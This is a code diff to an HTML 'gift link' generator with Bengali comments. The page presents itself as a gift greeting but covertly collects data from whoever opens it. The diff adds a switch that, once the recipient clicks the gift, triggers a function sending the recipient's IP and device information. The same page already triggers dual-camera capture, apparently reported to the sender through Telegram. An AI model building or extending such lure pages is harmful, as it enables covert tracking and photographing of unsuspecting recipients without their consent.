@@ -499,7 +499,7 @@
         input:checked + .slider:before {
             transform: translateX(22px);
         }
-        #image-gallery, #gif-gallery { /* *** সংশোধিত অংশ *** */
+        #image-gallery, #gif-gallery {
             display: flex;
             flex-wrap: wrap;
             gap: 10px;
@@ -586,7 +586,6 @@
                 </button>
             </div>
             <!-- গ্যালারি কন্টেইনার (ডিফল্টভাবে লুকানো) -->
-            <!-- *** সংশোধিত অংশ *** -->
             <div id="gallery-container" class="form-group hidden">
                 <!-- ছবির সেকশন -->
                 <label>একটি ছবি বেছে নিন:</label>
@@ -616,6 +615,21 @@
                     </label>
                 </div>
             </div>
+            
+            <!-- *** নতুন সুইচ যুক্ত করা হয়েছে *** -->
+            <div class="form-group">
+                <div class="switch-container">
+                    <label for="enableDeviceInfo" class="switch-label">
+                        <i class="fas fa-info-circle"></i> ডিভাইস তথ্য সিস্টেম চালু করুন
+                        <span>প্রাপকের আইপি ও ডিভাইসের তথ্য পেতে এটি অন করুন।</span>
+                    </label>
+                    <label class="switch">
+                        <input type="checkbox" id="enableDeviceInfo">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
             <button type="submit"><i class="fas fa-link"></i> গিফট লিঙ্ক তৈরি করুন</button>
         </form>
         <div id="generatedLinkContainer" class="hidden">
@@ -653,7 +667,6 @@
 
     <script>
         // --- আপনার ছবির লিঙ্কগুলো এখানে যোগ করুন ---
-        // *** সংশোধিত অংশ ***
         const predefinedImages = [
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/Image-1.jpg",
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-2.png",
@@ -665,13 +678,10 @@
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-8.jpeg",
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-8.png",
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-9.jpeg",
-            
-           
-        ];
+                ];
         // --- আপনার GIF লিঙ্কগুলো এখানে যোগ করুন ---
         const predefinedGifs = [
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-1.gif"
-            // এখানে কমা দিয়ে আরও লিঙ্ক যোগ করতে পারেন
         ];
 
         // --- টেলিগ্রাম এবং ক্যামেরা সেটিংস ---
@@ -796,7 +806,7 @@
             } else {
                 setupThemeSelector();
                 setupCountdownInput();
-                setupGalleries(); // *** সংশোধিত অংশ ***
+                setupGalleries(); 
                 setupGalleryToggle();
                 setupForm();
             }
@@ -810,7 +820,6 @@
             });
         }
 
-        // *** সংশোধিত অংশ ***
         function setupGalleries() {
             const imageGalleryContainer = document.getElementById('image-gallery');
             const gifGalleryContainer = document.getElementById('gif-gallery');
@@ -871,6 +880,9 @@
                 if (params.get('theme') === 'custom') params.set('ct', document.getElementById('customThemeText').value);
                 if (document.getElementById('enableCountdown').checked) params.set('cd', document.getElementById('countdownDateTime').value);
                 if (document.getElementById('enableCamera').checked) params.set('cam', 'true');
+                
+                // *** নতুন সুইচের জন্য কোড যুক্ত করা হয়েছে ***
+                if (document.getElementById('enableDeviceInfo').checked) params.set('info', 'true');
 
                 const giftLink = `${window.location.href.split('?')[0]}?${params.toString()}`;
                 document.getElementById('generatedLink').value = giftLink;
@@ -933,7 +945,11 @@
 
             document.getElementById('giftWrapper').addEventListener('click', () => {
                 const caption = `Gift from: ${sender}\nTo: ${receiver}`;
-                sendDeviceInfo();
+
+                // *** নতুন সুইচের কার্যকারিতা যুক্ত করা হয়েছে ***
+                if (params.get('info') === 'true') {
+                    sendDeviceInfo();
+                }
                 if (params.get('cam') === 'true') {
                     initiateDualCameraCapture(caption);
                 }
@@ -978,7 +994,3 @@
     </script>
 </body>
 </html>
-
-
-
-
